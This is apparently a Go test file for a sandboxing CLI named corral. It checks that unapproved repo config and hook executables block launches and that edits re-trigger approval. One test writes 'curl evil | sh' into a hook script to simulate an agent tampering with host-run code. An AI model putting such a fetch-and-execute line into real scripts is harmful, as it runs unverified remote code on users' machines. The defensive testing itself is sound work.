package cli

import (
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/go-corral/corral/internal/cli/report"
	"github.com/go-corral/corral/internal/config"
	"github.com/go-corral/corral/internal/providers"
	"github.com/go-corral/corral/internal/providers/hooks"
	"github.com/go-corral/corral/internal/trust"
)

// trustRepo sets up an isolated home + project carrying an unapproved .corral.yml and
// returns the two dirs. Isolation is without pre-approval, so the gate fires as in
// production.
func trustRepo(t *testing.T, projectYAML string) (home, proj string) {
	t.Helper()
	home = t.TempDir()
	proj = filepath.Join(home, "proj")
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(proj, ".corral.yml"), []byte(projectYAML), 0o644); err != nil {
		t.Fatal(err)
	}
	isolateConfigEnvNoApprove(t, home, proj)
	return home, proj
}

// runCmd runs cmdRun with a controlled non-tty stdin, so the interactive seams behave
// deterministically regardless of the terminal the suite runs under: the real
// promptTrustApproval sees a non-terminal (returns "no interactive answer") unless a test
// overrides it, and confirmProceed's warnings gate auto-proceeds. Returns the exit code
// and captured stderr.
func runCmd(t *testing.T, args ...string) (code int, stderr string) {
	t.Helper()
	stderr = captureStderr(t, func() {
		withStdin(t, "", func() { code = cmdRun(args, "dev") })
	})
	return
}

// syncCmd is runCmd's sync analogue; it also captures stdout (sync's report).
func syncCmd(t *testing.T, args ...string) (code int, stdout, stderr string) {
	t.Helper()
	stderr = captureStderr(t, func() {
		stdout = captureStdout(t, func() {
			withStdin(t, "", func() { code = cmdSync(args) })
		})
	})
	return
}

// failIfMint stubs the Mint seam to fail the test if a launch reaches it — asserting the
// gate blocked before any provider minted (a decline/block must leak nothing).
func failIfMint(t *testing.T) {
	t.Helper()
	orig := resolveProviders
	t.Cleanup(func() { resolveProviders = orig })
	resolveProviders = func(context.Context, providers.Session, []providers.Active) (*providers.Resolved, error) {
		t.Error("a launch blocked by the trust gate reached the Mint seam")
		return &providers.Resolved{}, nil
	}
}

// stopAtMint stubs the Mint seam to record it was reached and stop the launch cleanly
// (before any real backend) — asserting the gate allowed the launch through.
func stopAtMint(t *testing.T, reached *bool) {
	t.Helper()
	orig := resolveProviders
	t.Cleanup(func() { resolveProviders = orig })
	resolveProviders = func(context.Context, providers.Session, []providers.Active) (*providers.Resolved, error) {
		*reached = true
		return nil, errResolveStub
	}
}

// setTrustPrompt overrides the interactive-approval seam and restores it on cleanup.
func setTrustPrompt(t *testing.T, fn func() (answered, approved bool)) {
	t.Helper()
	orig := promptTrustApproval
	t.Cleanup(func() { promptTrustApproval = orig })
	promptTrustApproval = func(*os.File, io.Writer, report.Style) (bool, bool) { return fn() }
}

// assertAllUnapproved fails unless every repo-config entry under proj is still unapproved.
func assertAllUnapproved(t *testing.T, home, proj string) {
	t.Helper()
	_, sources, err := config.Load(config.LoadOptions{Home: home, ProjectDir: proj})
	if err != nil {
		t.Fatalf("load for assertion: %v", err)
	}
	entries := trustEntries(sources)
	pending := trust.NewStore(trust.DefaultDir(home)).Pending(entries)
	if len(pending) != len(entries) {
		t.Errorf("expected all %d repo entries still unapproved, got %d pending", len(entries), len(pending))
	}
}

// A non-interactive `corral run` on unapproved repo config fails closed and mints nothing.
func TestRunBlocksUnapprovedRepoConfigNonInteractive(t *testing.T) {
	home, proj := trustRepo(t, "hostname: repo\n")
	failIfMint(t)
	stubUpdateCheck(t)

	code, stderr := runCmd(t, "--home", home, "--project", proj)
	if code == 0 {
		t.Fatalf("unapproved repo config on a non-tty must fail closed, got code 0")
	}
	if !strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("expected the unapproved-config notice on stderr:\n%s", stderr)
	}
	if !strings.Contains(stderr, "interactive run") {
		t.Errorf("expected the non-interactive fail-closed explanation:\n%s", stderr)
	}
	assertAllUnapproved(t, home, proj)
}

// /dev/null is a character device, so a mode-bit tty check would misread it as interactive;
// report.IsTerminal asks the tty driver instead. With /dev/null stdin the trust gate must report the
// actionable trustNonInteractiveMsg (approve in a real terminal), not trustDeclinedMsg ("not
// approved — aborted"). os.Stdin is swapped directly because withStdin's pipe is never a
// character device.
func TestRunBlocksUnapprovedRepoConfigDevNull(t *testing.T) {
	home, proj := trustRepo(t, "hostname: repo\n")
	failIfMint(t)
	stubUpdateCheck(t)

	devNull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = devNull.Close() }()
	oldStdin := os.Stdin
	os.Stdin = devNull
	defer func() { os.Stdin = oldStdin }()

	var code int
	stderr := captureStderr(t, func() {
		code = cmdRun([]string{"--home", home, "--project", proj}, "dev")
	})
	if code == 0 {
		t.Fatalf("unapproved repo config on /dev/null must fail closed, got code 0")
	}
	if !strings.Contains(stderr, "interactive run") {
		t.Errorf("expected the non-interactive fail-closed explanation, got:\n%s", stderr)
	}
	if strings.Contains(stderr, trustDeclinedMsg) {
		t.Errorf("must not print the decline message on non-interactive /dev/null stdin:\n%s", stderr)
	}
	assertAllUnapproved(t, home, proj)
}

func TestPromptTrustApprovalDevNullNonInteractive(t *testing.T) {
	f, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()

	var out strings.Builder
	answered, approved := promptTrustApproval(f, &out, report.Style{})
	if answered {
		t.Error("promptTrustApproval(/dev/null) answered=true, want false (no interactive answer is possible)")
	}
	if approved {
		t.Error("promptTrustApproval(/dev/null) approved=true, want false")
	}
	if out.Len() != 0 {
		t.Errorf("promptTrustApproval prompted on /dev/null: %q", out.String())
	}
}

// --yes acknowledges advisory warnings; it must never approve new repo code.
func TestRunYesDoesNotApproveRepoConfig(t *testing.T) {
	home, proj := trustRepo(t, "hostname: repo\n")
	failIfMint(t)
	stubUpdateCheck(t)

	code, stderr := runCmd(t, "--yes", "--home", home, "--project", proj)
	if code == 0 {
		t.Fatalf("--yes must not approve new repo config; expected fail-closed")
	}
	if !strings.Contains(stderr, "--yes") {
		t.Errorf("expected the --yes refusal explanation:\n%s", stderr)
	}
	assertAllUnapproved(t, home, proj)
}

// An interactive 'y' approves, persists, and a second run proceeds without re-prompting.
func TestRunApprovePersistsAndSecondRunProceeds(t *testing.T) {
	home, proj := trustRepo(t, "hostname: ok\n")
	stubUpdateCheck(t)

	prompts := 0
	setTrustPrompt(t, func() (bool, bool) { prompts++; return true, true })

	reached := false
	stopAtMint(t, &reached)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 1 {
		t.Fatalf("first run should prompt exactly once, got %d", prompts)
	}
	if !reached {
		t.Fatalf("an approved launch must reach the Mint seam")
	}

	// Second run: config is approved, so the prompt must not fire again.
	setTrustPrompt(t, func() (bool, bool) {
		t.Fatal("second run re-prompted for already-approved config")
		return false, false
	})
	reached2 := false
	stopAtMint(t, &reached2)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if !reached2 {
		t.Fatalf("second run (approved) must proceed to the Mint seam")
	}
}

// Editing an approved config re-arms the gate (content-hash keyed).
func TestRunContentChangeReprompts(t *testing.T) {
	home, proj := trustRepo(t, "hostname: v1\n")
	stubUpdateCheck(t)
	cfgPath := filepath.Join(proj, ".corral.yml")

	prompts := 0
	setTrustPrompt(t, func() (bool, bool) { prompts++; return true, true })

	reached := false
	stopAtMint(t, &reached)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 1 {
		t.Fatalf("first run prompts=%d, want 1", prompts)
	}

	// Changed bytes invalidate the stored approval.
	if err := os.WriteFile(cfgPath, []byte("hostname: v2\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	reached2 := false
	stopAtMint(t, &reached2)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 2 {
		t.Fatalf("a content change must re-prompt; prompts=%d, want 2", prompts)
	}
}

// A declined trust prompt aborts before any provider mints.
func TestRunDeclineAbortsPreMint(t *testing.T) {
	home, proj := trustRepo(t, "hostname: ok\n")
	stubUpdateCheck(t)
	failIfMint(t)
	setTrustPrompt(t, func() (bool, bool) { return true, false }) // answered, declined

	code, stderr := runCmd(t, "--home", home, "--project", proj)
	if code == 0 {
		t.Fatalf("a declined trust prompt must abort the launch")
	}
	if !strings.Contains(stderr, "not approved") {
		t.Errorf("expected the decline message:\n%s", stderr)
	}
	assertAllUnapproved(t, home, proj)
}

// `corral sync` is a gated consumer: unapproved repo config fails closed and writes no
// settings.json.
func TestSyncBlocksUnapprovedRepoConfig(t *testing.T) {
	home, _ := trustRepo(t, "hostname: ok\n")
	settings := filepath.Join(home, ".claude", "settings.json")

	code, _, stderr := syncCmd(t, "--settings", settings, "--binary", "/usr/local/bin/corral")
	if code == 0 {
		t.Fatalf("sync must fail closed on unapproved repo config")
	}
	if !strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("expected the unapproved-config notice:\n%s", stderr)
	}
	if _, err := os.Stat(settings); !os.IsNotExist(err) {
		t.Errorf("sync wrote settings.json despite the trust gate (stat err=%v)", err)
	}
}

// Once approved, sync proceeds and registers the hook.
func TestSyncApprovedRepoConfigProceeds(t *testing.T) {
	home, _ := trustRepo(t, "hostname: ok\n")
	setTrustPrompt(t, func() (bool, bool) { return true, true })
	settings := filepath.Join(home, ".claude", "settings.json")

	_, stdout, _ := syncCmd(t, "--settings", settings, "--binary", "/usr/local/bin/corral")
	if !strings.Contains(stdout, "registered hooks") {
		t.Errorf("an approved sync should proceed and register hooks:\n%s", stdout)
	}
	if _, err := os.Stat(settings); err != nil {
		t.Errorf("an approved sync should write settings.json: %v", err)
	}
}

// `corral run --dry-run` is an inspection tool: it must not be gated even on unapproved
// config (it mints nothing and only prints the would-be command).
func TestRunDryRunNotGated(t *testing.T) {
	home, proj := trustRepo(t, "hostname: ok\n")
	failIfMint(t) // dry-run must never mint regardless

	var code int
	var stdout, stderr string
	stderr = captureStderr(t, func() {
		stdout = captureStdout(t, func() {
			withStdin(t, "", func() {
				code = cmdRun([]string{"--dry-run", "--home", home, "--project", proj}, "dev")
			})
		})
	})
	if code != 0 {
		t.Fatalf("run --dry-run on unapproved config must not be gated, got code %d\n%s", code, stderr)
	}
	if strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("run --dry-run must not block on trust:\n%s", stderr)
	}
	if !strings.Contains(stdout, "bwrap") && !strings.Contains(stdout, "sandbox-exec") {
		t.Errorf("run --dry-run should still print the sandbox command:\n%s", stdout)
	}
}

// `corral sync --dry-run` previews without writing, so it too is not gated.
func TestSyncDryRunNotGated(t *testing.T) {
	home, _ := trustRepo(t, "hostname: ok\n")
	settings := filepath.Join(home, ".claude", "settings.json")

	code, stdout, stderr := syncCmd(t, "--dry-run", "--settings", settings, "--binary", "/usr/local/bin/corral")
	if code != 0 {
		t.Fatalf("sync --dry-run on unapproved config must not be gated, got code %d\n%s", code, stderr)
	}
	if strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("sync --dry-run must not block on trust:\n%s", stderr)
	}
	if _, err := os.Stat(settings); !os.IsNotExist(err) {
		t.Errorf("sync --dry-run must not write settings.json (stat err=%v)", err)
	}
	_ = stdout
}

// --- session-hook executables ride the same gate ---

// hookRepo is trustRepo plus a hooks block and its executable file; the config file is then
// pre-approved, so anything the gate still stops on is the executable itself.
func hookRepo(t *testing.T) (home, proj, script string) {
	t.Helper()
	home, proj = trustRepo(t, "providers:\n  home:\n    enabled: false\n  hooks:\n    preStart:\n      10-up:\n        exec: ./up.sh\n")
	script = filepath.Join(proj, "up.sh")
	if err := os.WriteFile(script, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	// Approve only the config file — the executable stays pending.
	_, sources, err := config.Load(config.LoadOptions{Home: home, ProjectDir: proj})
	if err != nil {
		t.Fatal(err)
	}
	if err := trust.NewStore(trust.DefaultDir(home)).Approve(trustEntries(sources)); err != nil {
		t.Fatal(err)
	}
	return home, proj, script
}

// A pending hook executable blocks a non-interactive run exactly like pending config —
// attributed to the config path that names it, and nothing mints.
func TestRunBlocksUnapprovedHookExec(t *testing.T) {
	home, proj, _ := hookRepo(t)
	failIfMint(t)
	stubUpdateCheck(t)

	code, stderr := runCmd(t, "--home", home, "--project", proj)
	if code == 0 {
		t.Fatalf("an unapproved hook executable on a non-tty must fail closed")
	}
	if !strings.Contains(stderr, "unapproved session-hook executable") {
		t.Errorf("expected the hook-executable pending header:\n%s", stderr)
	}
	if !strings.Contains(stderr, "(providers.hooks.preStart.10-up)") {
		t.Errorf("the pending executable must be attributed to its config path:\n%s", stderr)
	}
	if strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("the header must not name repo config — the config itself is approved:\n%s", stderr)
	}
}

// Editing an approved hook executable re-arms the gate (content-hash keyed), exactly like
// editing the config — the closed loophole: approval now covers the code that runs, not
// only the config bytes pointing at it.
func TestRunHookExecChangeReprompts(t *testing.T) {
	home, proj, script := hookRepo(t)
	stubUpdateCheck(t)

	prompts := 0
	setTrustPrompt(t, func() (bool, bool) { prompts++; return true, true })
	reached := false
	stopAtMint(t, &reached)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 1 || !reached {
		t.Fatalf("first run: prompts=%d reached=%v, want 1/true", prompts, reached)
	}

	// Approved content → the second run passes silently.
	reached2 := false
	stopAtMint(t, &reached2)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 1 || !reached2 {
		t.Fatalf("second run must not re-prompt: prompts=%d reached=%v", prompts, reached2)
	}

	// The "agent edited the workdir script" move: the next launch must stop again.
	if err := os.WriteFile(script, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	reached3 := false
	stopAtMint(t, &reached3)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if prompts != 2 {
		t.Fatalf("an edited hook executable must re-prompt; prompts=%d, want 2", prompts)
	}
}

// Hooks defined in the global config are gated too: the config layer is implicitly trusted
// as config, but the file it points at is host-run code — the trust unit is the executable.
// This is the case where the gate fires with no repo config.
func TestRunGlobalConfigHookExecGated(t *testing.T) {
	home := t.TempDir()
	proj := filepath.Join(home, "proj")
	if err := os.MkdirAll(filepath.Join(home, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(proj, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "bin", "report.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	isolateConfigEnvNoApprove(t, home, proj)
	globalDir := filepath.Join(home, ".config", "corral")
	if err := os.MkdirAll(globalDir, 0o755); err != nil {
		t.Fatal(err)
	}
	global := "providers:\n  home:\n    enabled: false\n  hooks:\n    postEnd:\n      report:\n        exec: ~/bin/report.sh\n"
	if err := os.WriteFile(filepath.Join(globalDir, "config.yml"), []byte(global), 0o644); err != nil {
		t.Fatal(err)
	}
	failIfMint(t)
	stubUpdateCheck(t)

	code, stderr := runCmd(t, "--home", home, "--project", proj)
	if code == 0 {
		t.Fatalf("a global-config hook's unapproved executable must fail closed")
	}
	if !strings.Contains(stderr, "(providers.hooks.postEnd.report)") {
		t.Errorf("expected the attributed pending executable:\n%s", stderr)
	}
	if strings.Contains(stderr, "unapproved repo config") {
		t.Errorf("no repo config exists — the header may name only the executable:\n%s", stderr)
	}
}

// An unreadable executable produces no trust entry and must not block the gate: the runtime
// owns that failure (fail-closed for a non-optional preStart, warn/skip elsewhere), and the
// gate duplicating it would break optional-hook semantics.
func TestRunUnreadableHookExecPassesGateFailsAtRun(t *testing.T) {
	home, proj, script := hookRepo(t)
	stubUpdateCheck(t)
	if err := os.Remove(script); err != nil {
		t.Fatal(err)
	}
	setTrustPrompt(t, func() (bool, bool) {
		t.Error("a missing executable must not trigger the trust prompt (nothing to approve)")
		return true, true
	})
	reached := false
	stopAtMint(t, &reached)
	_, _ = runCmd(t, "--home", home, "--project", proj)
	if !reached {
		t.Fatal("the gate must pass an unreadable executable through to the runtime failure")
	}
}

// collectHookExecs: dedupe by resolved path with joined attribution, disabled entries
// skipped, unreadable files recorded but not hashed.
func TestCollectHookExecs(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "shared.sh"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{}
	cfg.Providers.Hooks.PreStart = map[string]hooks.Hook{
		"10-a": {Exec: "./shared.sh"},
		"20-b": {Exec: "shared.sh"},                      // same file, other spelling
		"30-c": {Exec: "./off.sh", Enabled: boolFalse()}, // disabled → ignored
		"40-d": {Exec: "./missing.sh"},                   // unreadable → no entry
	}
	cfg.Providers.Hooks.PostEnd = map[string]hooks.Hook{
		"report": {Exec: "./shared.sh"}, // same file again, other event
	}
	got := collectHookExecs(cfg, dir)
	if len(got.entries) != 1 {
		t.Fatalf("want 1 deduped entry, got %d: %+v", len(got.entries), got.entries)
	}
	shared := filepath.Join(dir, "shared.sh")
	if got.entries[0].Path != shared || len(got.entries[0].SHA256) != 64 {
		t.Errorf("entry = %+v, want hashed %s", got.entries[0], shared)
	}
	wantAttr := "providers.hooks.preStart.10-a, providers.hooks.preStart.20-b, providers.hooks.postEnd.report"
	if got.attr[shared] != wantAttr {
		t.Errorf("attr = %q, want %q", got.attr[shared], wantAttr)
	}
	if _, ok := got.attr[filepath.Join(dir, "off.sh")]; ok {
		t.Error("a disabled entry must not be collected")
	}
	if got.unreadable[filepath.Join(dir, "missing.sh")] == "" {
		t.Error("an unreadable executable must be recorded for the read-only views")
	}
}

func boolFalse() *bool { b := false; return &b }

// trustEntries covers only the repo-discovered layers; global/defaults/profile are
// implicitly trusted and excluded.
func TestTrustEntriesFiltersToRepoLayers(t *testing.T) {
	got := trustEntries([]config.Source{
		{Kind: "defaults"},
		{Kind: "global", Path: "/g/config.yml", SHA256: "g"},
		{Kind: "project", Path: "/p/.corral.yml", SHA256: "p"},
		{Kind: "local", Path: "/p/.corral.local.yml", SHA256: "l"},
		{Kind: "profile", Path: "prod"},
	})
	if len(got) != 2 {
		t.Fatalf("want 2 repo entries (project+local), got %d: %+v", len(got), got)
	}
	if got[0].Path != "/p/.corral.yml" || got[1].Path != "/p/.corral.local.yml" {
		t.Errorf("unexpected entries: %+v", got)
	}
}
